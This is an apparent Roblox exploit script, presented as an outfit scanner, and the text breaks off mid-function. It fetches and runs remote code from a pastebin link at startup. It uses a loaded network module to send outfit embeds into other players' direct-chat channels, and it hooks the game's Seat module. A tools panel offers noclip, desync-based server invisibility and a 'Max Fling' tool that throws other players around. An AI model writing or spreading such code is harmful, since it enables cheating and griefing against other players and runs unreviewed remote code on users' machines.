-- Ultimate Roblox Workspace Metadata Engine & Layered Clothing Scanner (Standalone Server Edition)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local MarketplaceService = game:GetService("MarketplaceService")
local InsertService = game:GetService("InsertService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

---load network
pcall(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))()
end)
task.wait(1)

getgenv().Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
getgenv().Get = getgenv().Get or (getgenv().g and getgenv().g.Get)




-- Life Together RP Payload Formatter
local function buildBatchPayload(data)
    local accessories = {}
    local order = 1
    if data.Accessories then
        for _, acc in ipairs(data.Accessories) do
            local isLayered = acc.IsLayered == true
            table.insert(accessories, {
                AssetId = acc.AssetId,
                AccessoryType = acc.AccessoryType,
                IsLayered = isLayered,
                Rotation = "  ",
                Position = "  ",
                Scale = "1 1 1",
                Order = isLayered and order or nil,
                Puffiness = isLayered and 0 or nil
            })
            if isLayered then order = order + 1 end
        end
    end

    -- Smart Skin Tone Encoder using captured valid strings
    local safeSkinString = "^l?B" -- Default to ligh tancolor
    if data.SkinTone then
        local r, g, b = data.SkinTone[1], data.SkinTone[2], data.SkinTone[3]
        if ((r + g + b) / 3) < 0.4 then
            safeSkinString = ";<,#" -- Dark Skin String
        end
    end

    return {
        accessories = accessories,
        properties = {
            Head = data.Head or 0,
            Torso = data.Torso or 0,
            LeftArm = data.LeftArm or 0,
            RightArm = data.RightArm or 0,
            LeftLeg = data.LeftLeg or 0,
            RightLeg = data.RightLeg or 0,
            Face = data.Face or 0,
            Shirt = data.Shirt or 0,
            Pants = data.Pants or 0,
            GraphicTShirt = data.GraphicTShirt or 0,
           
            RunAnimation = data.RunAnimation or 0,
            WalkAnimation = data.WalkAnimation or 0,
            JumpAnimation = data.JumpAnimation or 0,
            FallAnimation = data.FallAnimation or 0,
            ClimbAnimation = data.ClimbAnimation or 0,
            IdleAnimation = data.IdleAnimation or 0,
            SwimAnimation = data.SwimAnimation or 0,
            
            HeightScale = data.HeightScale or 1,
            WidthScale = data.WidthScale or 1,
            DepthScale = data.DepthScale or 1,
            HeadScale = data.HeadScale or 1,
            BodyTypeScale = data.BodyTypeScale or 0.25,
            ProportionScale = data.ProportionScale or 0,

            -- Automatically applies the safe string without crashing JSON
            HeadColor = safeSkinString,
            TorsoColor = safeSkinString,
            LeftArmColor = safeSkinString,
            RightArmColor = safeSkinString,
            LeftLegColor = safeSkinString,
            RightLegColor = safeSkinString,
        }
    }
end

-- Reusable Outfit Sharing Function
-- Reusable Outfit Sharing Function (Now with an excluded target!)
local function shareOutfitToAll(rawOutfitData, buttonElement, defaultText, defaultColor, excludedPlayer)
    local payload = buildBatchPayload(rawOutfitData)
    payload.makeups = {} -- Vital to prevent server crash
    
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if not Send then 
        buttonElement.Text = "No Net"
        task.wait(2)
        buttonElement.Text = defaultText
        return 
    end

    buttonElement.Text = "Sharing..."
    buttonElement.BackgroundColor3 = Color3.fromRGB(150, 50, 150)

    task.spawn(function()
        local embedData = {
            outfit_id = -2,
            app = "Avatar",
            accept = "View",
            content = "Custom Outfit",
            func = "view_outfit",
            desc = payload
        }
        local embedJson = HttpService:JSONEncode(embedData)
        
        local sharedCount = 0
        local myId = LocalPlayer.UserId
        
        for _, p in ipairs(Players:GetPlayers()) do
            -- [UPDATED] Skip LocalPlayer AND skip the excludedPlayer!
            if p ~= LocalPlayer and p ~= excludedPlayer and sharedCount < 20 then
                task.spawn(function()
                    pcall(function()
                        local targetId = p.UserId
                        Send("can_users_direct_chat", myId, targetId)
                        
                        local channelStr = ""
                        if myId < targetId then
                            channelStr = tostring(myId) .. " " .. tostring(targetId)
                        else
                            channelStr = tostring(targetId) .. " " .. tostring(myId)
                        end
                        
                        Send("out_embed", channelStr, embedJson, "!EMBED")
                    end)
                end)
                sharedCount = sharedCount + 1
                task.wait(0.1) 
            end
        end
        
        if sharedCount > 0 then
            buttonElement.Text = "Shared!"
            buttonElement.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        else
            buttonElement.Text = "Failed"
            buttonElement.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        end
        
        task.wait(2)
        buttonElement.Text = defaultText
        buttonElement.BackgroundColor3 = defaultColor
    end)
end

-- Prevent duplicate GUIs
if LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeepMetadataScanner") then
    LocalPlayer.PlayerGui.DeepMetadataScanner:Destroy()
end
---

-- ==============================================================
-- 🛠️ REUSABLE UI COMPONENT LIBRARY (For Future Features)
-- ==============================================================

-- 1. Reusable Slider Function
local function createSlider(parent, titleText, minVal, maxVal, defaultVal, callback)
    local SliderFrame = Instance.new("Frame")
    SliderFrame.Size = UDim2.new(1, -5, 0, 50)
    SliderFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    SliderFrame.BorderSizePixel = 0
    SliderFrame.Parent = parent
    Instance.new("UICorner", SliderFrame).CornerRadius = UDim.new(0, 8)

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -10, 0, 20)
    Label.Position = UDim2.new(0, 10, 0, 5)
    Label.BackgroundTransparency = 1
    Label.Text = titleText .. ": " .. tostring(defaultVal)
    Label.TextColor3 = Color3.fromRGB(220, 220, 220)
    Label.Font = Enum.Font.SourceSansBold
    Label.TextSize = 14
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = SliderFrame

    local BarBg = Instance.new("Frame")
    BarBg.Size = UDim2.new(1, -20, 0, 10)
    BarBg.Position = UDim2.new(0, 10, 0, 30)
    BarBg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    BarBg.BorderSizePixel = 0
    BarBg.Parent = SliderFrame
    Instance.new("UICorner", BarBg).CornerRadius = UDim.new(1, 0)

    local fillScale = (defaultVal - minVal) / (maxVal - minVal)
    local BarFill = Instance.new("Frame")
    BarFill.Size = UDim2.new(math.clamp(fillScale, 0, 1), 0, 1, 0)
    BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    BarFill.BorderSizePixel = 0
    BarFill.Parent = BarBg
    Instance.new("UICorner", BarFill).CornerRadius = UDim.new(1, 0)

    local Handle = Instance.new("Frame")
    Handle.Size = UDim2.new(0, 16, 0, 16)
    Handle.AnchorPoint = Vector2.new(0.5, 0.5)
    Handle.Position = UDim2.new(1, 0, 0.5, 0)
    Handle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Handle.Parent = BarFill
    Instance.new("UICorner", Handle).CornerRadius = UDim.new(1, 0)

    local isDragging = false
    local function updateSlider(input)
        local pos = math.clamp((input.Position.X - BarBg.AbsolutePosition.X) / BarBg.AbsoluteSize.X, 0, 1)
        BarFill.Size = UDim2.new(pos, 0, 1, 0)
        local val = math.floor(minVal + (maxVal - minVal) * pos)
        Label.Text = titleText .. ": " .. tostring(val)
        callback(val)
    end

    BarBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            updateSlider(input)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            updateSlider(input)
        end
    end)

    return SliderFrame
end

-- 2. Reusable "Hold To Interact" Button Function
local function createHoldButton(parent, titleText, color, onHoldStart, onHoldEnd)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, -5, 0, 40)
    Btn.BackgroundColor3 = color or Color3.fromRGB(40, 40, 50)
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.SourceSansBold
    Btn.TextSize = 16
    Btn.Text = titleText
    Btn.BorderSizePixel = 0
    Btn.Parent = parent
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
    
    Btn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if onHoldStart then onHoldStart() end
        end
    end)
    
    Btn.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if onHoldEnd then onHoldEnd() end
        end
    end)
    return Btn
end

-- 3. Reusable "Fold For More" Dropdown Section (Like Avatar Scaler)
local function createCollapsible(parent, titleText, openHeight)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -5, 0, 30)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    Frame.BorderSizePixel = 0
    Frame.ClipsDescendants = true
    Frame.Parent = parent

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(1, 0, 0, 30)
    ToggleBtn.Text = "  " .. titleText .. " [ ▼ ]"
    ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
    ToggleBtn.Font = Enum.Font.SourceSansBold
    ToggleBtn.TextSize = 14
    ToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    ToggleBtn.BorderSizePixel = 0
    ToggleBtn.Parent = Frame

    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, 0, 1, -30)
    Content.Position = UDim2.new(0, 0, 0, 30)
    Content.BackgroundTransparency = 1
    Content.Visible = false
    Content.Parent = Frame

    local expanded = false
    ToggleBtn.MouseButton1Click:Connect(function()
        expanded = not expanded
        if expanded then
            Frame.Size = UDim2.new(1, -5, 0, openHeight)
            Content.Visible = true
            ToggleBtn.Text = "  " .. titleText .. " [ ▲ ]"
        else
            Frame.Size = UDim2.new(1, -5, 0, 30)
            Content.Visible = false
            ToggleBtn.Text = "  " .. titleText .. " [ ▼ ]"
        end
    end)
    
    -- Return the Content frame so you can put buttons/sliders inside it!
    return Content 
end
-- 4. Reusable "Smart Hold" Button Logic (Swipe-Proof!)
local function applySmartHold(button, container, normalHeight, expandedHeight, holdTime, onShortClick, onUpdate)
    local holdTick = 0
    local isHolding = false
    local isExpanded = false
    local startPos = Vector3.new()

    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isHolding = true
            holdTick = tick()
            startPos = input.Position -- Record exactly where the touch started
            
            task.spawn(function()
                task.wait(holdTime)
                -- If they are STILL holding and haven't swiped away
                if isHolding then
                    isExpanded = not isExpanded
                    if isExpanded then
                        container.Size = UDim2.new(1, -5, 0, expandedHeight)
                    else
                        container.Size = UDim2.new(1, -5, 0, normalHeight)
                    end
                    if onUpdate then onUpdate(isExpanded) end
                end
            end)
        end
    end)

    -- NEW: Cancel the hold if the finger slides (Scrolling the UI)
    button.InputChanged:Connect(function(input)
        if isHolding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local dist = (input.Position - startPos).Magnitude
            if dist > 15 then -- If moved more than 15 pixels, it's a swipe!
                isHolding = false
            end
        end
    end)

    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            -- If the touch wasn't already cancelled by a swipe
            if isHolding then
                isHolding = false
                
                -- Verify one last time that they didn't drift
                local dist = (input.Position - startPos).Magnitude
                if dist <= 15 then
                    -- If released quickly, it's a normal click!
                    if tick() - holdTick < holdTime then
                        if onShortClick then onShortClick() end
                        if onUpdate then onUpdate(isExpanded) end
                    end
                end
            end
        end
    end)
end

--deep scan

-- Create Layout Screen UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeepMetadataScanner"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Drag Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.15, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
MainFrame.BorderSizePixel = 1
MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true

-- Top Title Bar Frame
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 35)
TopBar.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -90, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "🧬 Deep Live Outfit Scanner"
Title.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.BackgroundTransparency = 1
Title.Parent = TopBar

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -35, 0, 0)
CloseBtn.Text = "X"
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 16
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent = TopBar

-- Minimize Button
local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -70, 0, 0)
MinBtn.Text = "-"
MinBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.SourceSansBold
MinBtn.TextSize = 18
MinBtn.BorderSizePixel = 0
MinBtn.Parent = TopBar

-- Back Button
local BackBtn = Instance.new("TextButton")
BackBtn.Size = UDim2.new(0, 60, 0, 25)
BackBtn.Position = UDim2.new(0, 10, 0, 45)
BackBtn.Text = "◀ Back"
BackBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
BackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BackBtn.Font = Enum.Font.SourceSansBold
BackBtn.TextSize = 14
BackBtn.BorderSizePixel = 0
BackBtn.Visible = false
BackBtn.Parent = MainFrame

-- Refresh Button (Left 1/3)
local RefreshBtn = Instance.new("TextButton")
RefreshBtn.Size = UDim2.new(0.33, -10, 0, 25)
RefreshBtn.Position = UDim2.new(0, 10, 0, 45)
RefreshBtn.Text = "Refresh"
RefreshBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 100)
RefreshBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RefreshBtn.Font = Enum.Font.SourceSansBold
RefreshBtn.TextSize = 14
RefreshBtn.BorderSizePixel = 0
RefreshBtn.Parent = MainFrame

-- Saved Outfits Tab (Middle 1/3)
local SavedTabBtn = Instance.new("TextButton")
SavedTabBtn.Size = UDim2.new(0.33, -5, 0, 25)
SavedTabBtn.Position = UDim2.new(0.33, 5, 0, 45)
SavedTabBtn.Text = "Saved"
SavedTabBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
SavedTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SavedTabBtn.Font = Enum.Font.SourceSansBold
SavedTabBtn.TextSize = 14
SavedTabBtn.BorderSizePixel = 0
SavedTabBtn.Parent = MainFrame

-- Tools Tab (Right 1/3)
local ToolsTabBtn = Instance.new("TextButton")
ToolsTabBtn.Size = UDim2.new(0.33, -10, 0, 25)
ToolsTabBtn.Position = UDim2.new(0.66, 5, 0, 45)
ToolsTabBtn.Text = "Tools"
ToolsTabBtn.BackgroundColor3 = Color3.fromRGB(150, 80, 80)
ToolsTabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolsTabBtn.Font = Enum.Font.SourceSansBold
ToolsTabBtn.TextSize = 14
ToolsTabBtn.BorderSizePixel = 0
ToolsTabBtn.Parent = MainFrame

-- Containers for Views
local ContentContainer = Instance.new("Frame")
ContentContainer.Size = UDim2.new(1, 0, 1, -80)
ContentContainer.Position = UDim2.new(0, 0, 0, 80)
ContentContainer.BackgroundTransparency = 1
ContentContainer.Parent = MainFrame

-- Helper function to make all tabs look beautiful and scroll perfectly
local function createTabScroll(name, isVisible)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Name = name
    scroll.Size = UDim2.new(1, -16, 1, -10)
    scroll.Position = UDim2.new(0, 8, 0, 0)
    scroll.BackgroundColor3 = Color3.fromRGB(12, 12, 16) -- Darker, cleaner background
    scroll.ScrollBarThickness = 3
    scroll.BorderSizePixel = 0
    scroll.Visible = isVisible
    scroll.Parent = ContentContainer
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0, 8)
    
    -- Adding UIPadding fixes the cramped look and adds breathing room
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 8)
    padding.PaddingBottom = UDim.new(0, 40) -- Fixes bottom cutoff when shrunk!
    padding.PaddingLeft = UDim.new(0, 5)
    padding.PaddingRight = UDim.new(0, 5)
    padding.Parent = scroll
    
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 8)
    layout.Parent = scroll
    
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 50)
    end)
    
    return scroll, layout
end

-- Generates all tabs with perfect scrolling and padding instantly
local PlayerScroll, PlayerListLayout = createTabScroll("PlayerScroll", true)
local AssetScroll, AssetListLayout = createTabScroll("AssetScroll", false)
local SavedScroll, SavedListLayout = createTabScroll("SavedScroll", false)
local ToolsScroll, ToolsListLayout = createTabScroll("ToolsScroll", false)

-- ========== NO CLIP TOOL (State-Saving Hybrid) ==========
local RunService = game:GetService("RunService")
local noclipEnabled = false
local noclipConnection = nil
local originalCollisions = {}

local NoclipBtn = Instance.new("TextButton")
NoclipBtn.Size = UDim2.new(1, -5, 0, 40)
NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
NoclipBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoclipBtn.Font = Enum.Font.SourceSansBold
NoclipBtn.TextSize = 16
NoclipBtn.Text = "👻 No Clip: OFF"
NoclipBtn.BorderSizePixel = 0
NoclipBtn.Parent = ToolsScroll

NoclipBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end

    noclipEnabled = not noclipEnabled

    if noclipEnabled then
        NoclipBtn.Text = "👻 No Clip: ON"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Save the original collision states exactly like the reference script
        table.clear(originalCollisions)
        for _, v in ipairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                originalCollisions[v] = v.CanCollide
            end
        end

        -- 2. Force it false continuously to fight the Humanoid's auto-physics
        noclipConnection = RunService.Stepped:Connect(function()
            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end)
    else
        NoclipBtn.Text = "👻 No Clip: OFF"
        NoclipBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Stop the forced loop
        if noclipConnection then 
            noclipConnection:Disconnect() 
            noclipConnection = nil 
        end
        
        -- 3. Restore original collisions cleanly like the reference script
        for part, originalState in pairs(originalCollisions) do
            if part and part.Parent then
                part.CanCollide = originalState
            end
        end
        table.clear(originalCollisions)
    end
end)
-- ========== FE INVISIBLE TOOL (Desync Method) ==========
local feInvisEnabled = false
local invisConnections = {}
local ghostParts = {}

local FeInvisBtn = Instance.new("TextButton")
FeInvisBtn.Size = UDim2.new(1, -5, 0, 40)
FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FeInvisBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FeInvisBtn.Font = Enum.Font.SourceSansBold
FeInvisBtn.TextSize = 16
FeInvisBtn.Text = "🫥 Server Invis: OFF"
FeInvisBtn.BorderSizePixel = 0
FeInvisBtn.Parent = ToolsScroll

FeInvisBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    local rootPart = char and char:FindFirstChild("HumanoidRootPart")
    
    if not char or not humanoid or not rootPart then return end

    feInvisEnabled = not feInvisEnabled

    if feInvisEnabled then
        FeInvisBtn.Text = "🫥 Server Invis: ON"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Make us look like a ghost locally so we know it's on
        table.clear(ghostParts)
        for _, obj in pairs(char:GetDescendants()) do 
            if obj:IsA("BasePart") and obj.Transparency == 0 then 
                table.insert(ghostParts, obj)
                obj.Transparency = 0.5
            end 
        end

        -- The Desync Loop
        invisConnections[1] = RunService.Heartbeat:Connect(function()
            if feInvisEnabled and rootPart and humanoid then
                local cf = rootPart.CFrame
                local camOffset = humanoid.CameraOffset

                -- Fling way under the map exactly when the server updates
                local hidden = cf * CFrame.new(0, -200000, 0)
                rootPart.CFrame = hidden
                humanoid.CameraOffset = hidden:ToObjectSpace(CFrame.new(cf.Position)).Position

                -- Wait for our local screen to render
                RunService.RenderStepped:Wait()

                -- Snap back to normal for our screen
                rootPart.CFrame = cf
                humanoid.CameraOffset = camOffset
            end
        end)
    else
        FeInvisBtn.Text = "🫥 Server Invis: OFF"
        FeInvisBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup connections
        for _, conn in pairs(invisConnections) do conn:Disconnect() end
        table.clear(invisConnections)
        
        -- Restore our character's looks and camera
        for _, part in pairs(ghostParts) do
            if part and part.Parent then
                part.Transparency = 0
            end
        end
        if humanoid then
            humanoid.CameraOffset = Vector3.new(0,0,0)
        end
    end
end)

---
-- ========== ANTI-FLING & ANTI-VEHICLE FLING ==========
local antiFlingEnabled = false
local antiFlingConnection = nil

local AntiFlingBtn = Instance.new("TextButton")
AntiFlingBtn.Size = UDim2.new(1, -5, 0, 40)
AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
AntiFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiFlingBtn.Font = Enum.Font.SourceSansBold
AntiFlingBtn.TextSize = 16
AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
AntiFlingBtn.BorderSizePixel = 0
AntiFlingBtn.Parent = ToolsScroll

AntiFlingBtn.MouseButton1Click:Connect(function()
    antiFlingEnabled = not antiFlingEnabled

    if antiFlingEnabled then
        AntiFlingBtn.Text = "🛡️ Anti-Fling: ON"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- Runs before physics calculate to prevent touches
        antiFlingConnection = RunService.Stepped:Connect(function()
            local myChar = LocalPlayer.Character
            if not myChar then return end

            -- 1. PURE ANTI-FLING: Disable collisions for all other players globally
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Character then
                    for _, part in ipairs(p.Character:GetDescendants()) do
                        if part:IsA("BasePart") and part.CanCollide then
                            part.CanCollide = false
                        end
                    end
                end
            end

            -- 2. VELOCITY STABILIZER: Protects you and your vehicle from physics spikes
            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
            local myHum = myChar:FindFirstChildOfClass("Humanoid")
            
            if myHum and myHum.SeatPart then
                -- Anti-Vehicle Fling Logic
                local vehicle = myHum.SeatPart:FindFirstAncestorOfClass("Model")
                if vehicle then
                    local pPart = vehicle.PrimaryPart or myHum.SeatPart
                    if pPart then
                        if pPart.AssemblyAngularVelocity.Magnitude > 50 or pPart.AssemblyLinearVelocity.Magnitude > 400 then
                            pPart.AssemblyAngularVelocity = Vector3.zero
                            pPart.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                        end
                    end
                end
            elseif myRoot then
                -- Standard Player Anti-Fling Fallback
                if myRoot.AssemblyAngularVelocity.Magnitude > 50 or myRoot.AssemblyLinearVelocity.Magnitude > 250 then
                    myRoot.AssemblyAngularVelocity = Vector3.zero
                    myRoot.AssemblyLinearVelocity = Vector3.new(0, -10, 0)
                end
            end
        end)
    else
        AntiFlingBtn.Text = "🛡️ Anti-Fling: OFF"
        AntiFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        if antiFlingConnection then
            antiFlingConnection:Disconnect()
            antiFlingConnection = nil
        end
    end
end)

-- ========== LIFE TOGETHER RP ANTI-SIT TOOL ==========
local ltAntiSitEnabled = false
local ltAntiSitConnections = {}
local seatModule = nil

-- Attempt to find Life Together's specific Seat module
task.spawn(function()
    pcall(function()
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("ModuleScript") and v.Name == "Seat" then
                local s = require(v)
                -- Verify it's the right module by checking for the 'enabled.set' function
                if type(s) == "table" and s.enabled and s.enabled.set then
                    seatModule = s
                    break
                end
            end
        end
    end)
end)

local function hookLtCharacter(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    local conn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
        if not ltAntiSitEnabled then return end
        
        if humanoid.Sit then
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            task.spawn(function()
                if humanoid.SeatPart then
                    local weld = humanoid.SeatPart:FindFirstChildOfClass("Weld")
                    if weld then weld:Destroy() end
                    local prox = humanoid.SeatPart:FindFirstChildOfClass("ProximityPrompt")
                    if prox and prox.Enabled == false then
                        prox.Enabled = true
                    end
                end
                for _ = 1, 5 do
                    task.wait()
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    humanoid.Sit = false
                end
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            end)
        end
    end)
    table.insert(ltAntiSitConnections, conn)
end

local LtAntiSitBtn = Instance.new("TextButton")
LtAntiSitBtn.Size = UDim2.new(1, -5, 0, 40)
LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
LtAntiSitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
LtAntiSitBtn.Font = Enum.Font.SourceSansBold
LtAntiSitBtn.TextSize = 16
LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
LtAntiSitBtn.BorderSizePixel = 0
LtAntiSitBtn.Parent = ToolsScroll

LtAntiSitBtn.MouseButton1Click:Connect(function()
    ltAntiSitEnabled = not ltAntiSitEnabled
    
    if ltAntiSitEnabled then
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: ON"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        
        -- 1. Apply your custom character physics hook
        hookLtCharacter(LocalPlayer.Character)
        local charConn = LocalPlayer.CharacterAdded:Connect(hookLtCharacter)
        table.insert(ltAntiSitConnections, charConn)
        
        -- 2. Attack the Life Together Seat Module specifically (from your script)
        if seatModule then
            local loopConn = RunService.Stepped:Connect(function()
                if ltAntiSitEnabled then
                    pcall(function() seatModule.enabled.set(false) end)
                end
            end)
            table.insert(ltAntiSitConnections, loopConn)
        end
        
    else
        LtAntiSitBtn.Text = "🪑 LT Anti-Sit: OFF"
        LtAntiSitBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        
        -- Cleanup all loops and connections
        for _, conn in pairs(ltAntiSitConnections) do
            if conn and conn.Connected then conn:Disconnect() end
        end
        table.clear(ltAntiSitConnections)
        
        -- Restore Life Together's Seat Module back to normal
        if seatModule then
            pcall(function() seatModule.enabled.set(true) end)
        end
    end
end)

----------
-- ========== SYSTEM BROKEN V2 (Max Intensity Fling) ==========
local RunService = game:GetService("RunService")
local isSystemFlinging = false
local systemFlingLoop = nil
local originalProperties = {}

local FlingBtn = Instance.new("TextButton")
FlingBtn.Size = UDim2.new(1, -5, 0, 40)
FlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
FlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
FlingBtn.Font = Enum.Font.SourceSansBold
FlingBtn.TextSize = 16
FlingBtn.Text = "🌪️ Max Fling: OFF"
FlingBtn.BorderSizePixel = 0
FlingBtn.Parent = ToolsScroll

FlingBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    isSystemFlinging = not isSystemFlinging

    if isSystemFlinging then
        FlingBtn.Text = "🌪️ Max Fling: ON"
        FlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        
        -- 1. Increase our mass to the engine's limit so we don't bounce off targets
        table.clear(originalProperties)
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                originalProperties[part] = part.CustomPhysicalProperties
                part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            end
        end

        systemFlingLoop = RunService.Heartbeat:Connect(function()
            if not char or not root then return end
            
            -- Save your real movement and camera orientation
            local savedVel = root.Velocity
            local savedRot = root.RotVelocity
            
            -- 2. Violent Multi-Axis Spike (-50,000 Y combined with random X/Z rotation)
            root.Velocity = Vector3.new(math.random(-50000, 50000), -50000, math.random(-50000, 50000))
            root.RotVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), math.random(-50000, 50000))
            
            -- Wait for the engine to transfer this massive energy to the target
            RunService.RenderStepped:Wait()
            
